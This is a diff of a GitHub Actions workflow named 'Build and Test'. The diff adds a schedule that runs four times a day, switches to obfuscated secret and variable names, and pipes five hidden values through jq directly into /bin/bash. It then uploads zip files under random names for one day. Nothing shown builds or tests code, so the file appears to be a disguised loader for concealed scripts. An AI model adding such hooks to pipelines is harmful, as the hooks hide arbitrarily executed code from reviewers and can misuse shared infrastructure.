@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '5 2,8,14,20 * * *'
 jobs:
   trigger:
     runs-on: ubuntu-latest
@@ -10,15 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          chy10: ${{ secrets.chy10 }}
+          e69513: ${{ secrets.e69513 }}
         run: |
-          printf '%s' "$chy10" | jq -r .mc994 | /bin/bash
-          printf '%s' "$itxe40124" | jq -r .gs1971 | /bin/bash
-          echo $oxkw24523 | jq -r .fi87056 | /bin/bash
+          printf '%s' "$e69513" | jq -r .odd05 | /bin/bash
+          printf '%s' "$gd417" | jq -r .wc6445 | /bin/bash
+          echo $v332 | jq -r .fn583 | /bin/bash
+          echo $fgtod3 | jq -r .mhpbr99 | /bin/bash
+          echo $p85 | jq -r .gelo003 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: 31UunQ07
+          name: RW4r7IMW
           path: "*.zip"
           retention-days: 1
